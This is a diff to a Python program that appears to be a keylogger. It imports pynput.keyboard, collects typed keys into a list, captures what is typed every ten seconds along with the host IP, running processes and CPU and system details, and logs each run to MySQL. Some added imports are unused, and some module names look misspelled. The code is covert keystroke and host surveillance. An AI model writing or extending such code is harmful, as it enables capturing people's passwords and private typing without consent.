@@ -1,4 +1,8 @@
 import threading
+from _testcapi import ipowType
+
+from prompt_toolkit.filters import in_paste_mode
+
 from mongobd import conexion
 import pynput.keyboard
 import socket
@@ -8,6 +12,9 @@ from mysql import BasedeDatos
 import subproceso
 import platform
 import DATOSPC
+import consultas_mysql
+
+consulta = consultas_mysql
 
 lista_tecla=[] #En esta lista se guardaran las palabras
 
@@ -58,10 +65,17 @@ def ciclo_ejecucion():
     while True:
         #1.PRIMER PASO
         ip_equipo = socket.gethostbyname(socket.gethostname())
+        #ejecucion actual
+
         tiempo_inicial = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         time.sleep(10)
         lo_escrito = imprimir()
         tiempo_final = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        #Ejecucion mysql
+        consulta.insertar_ejecucion(tiempo_inicial,tiempo_final,ip_equipo)
+        #Ultimos procesos mysql
+        sub.ultimos_procesos_matriz(consulta.obtener_ultimo_id("ejecucion"))
+
         sub_proceso = sub.ultimos_procesos()
         infopc = datos.informacion_sistema()
         infoCPU = datos.informacion_CPU()
